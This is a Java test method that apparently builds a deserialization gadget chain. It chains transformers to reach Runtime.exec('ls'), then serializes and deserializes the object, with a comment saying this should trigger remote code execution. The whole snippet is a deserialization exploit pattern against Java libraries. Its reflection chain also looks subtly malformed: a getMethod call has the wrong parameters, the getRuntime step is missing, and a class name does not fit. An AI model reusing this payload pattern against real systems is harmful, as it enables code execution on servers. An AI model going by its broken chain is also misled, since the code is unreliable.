public void testInvokerTransformer() throws Exception {
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new MethodInvokerTransformer("getMethod", new Class[]{String.class}, new Object[]{"exec"}),
        new MethodInvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{"ls"}})
    };
    ChainTransformer chain = new ChainTransformer(transformers);

    Object template = Gadgets.createTemplatesImpl(chain);

    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(bos);
    oos.writeObject(template);
    oos.close();

    ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
    ObjectInputStream ois = new ObjectInputStream(bis);
    ois.readObject(); // This should trigger the remote code execution
}